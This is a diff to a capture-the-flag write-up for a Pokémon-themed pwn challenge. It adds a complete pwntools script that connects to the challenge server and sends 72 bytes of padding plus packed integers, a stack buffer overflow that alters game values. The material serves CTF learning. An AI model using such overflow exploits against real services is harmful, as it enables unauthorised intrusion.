@@ -273,7 +273,38 @@ r = p.recvall(timeout=2).decode()
 print(r)
 ```
 
-<del>obviouslychoosesparkforstab</del>
+Putting these together, we get the full script:
+```
+from pwn import *
+
+p = remote('challenge.tjcsec.club', 31600)
+
+p.recvuntil(b'what is your name?\n')
+p.sendline(b'butter')
+
+p.recvuntil(b'or (c)hallenge the pikaman master\n')
+p.sendline(b't')    
+
+p.recvuntil(b'Pika, pika!\n')
+
+pl = b'A' * 72
+pl += p32(90)
+pl += p32(1001)
+p.sendline(pl)  
+
+p.recvuntil(b'Pika? Pika?\n')
+p.sendline(b'im sorry for losing earlier pikachu')
+
+p.recvuntil(b'or (c)hallenge the pikaman master\n')
+p.sendline(b'c')
+
+p.recvuntil(b'Choose your move!')
+p.sendline(b's')
+
+r = p.recvall(timeout=2).decode()
+print(r)
+```
+
 It doesn't matter which attack you choose, because either way, you get the output:
 ```
  (t)ackle or (s)park
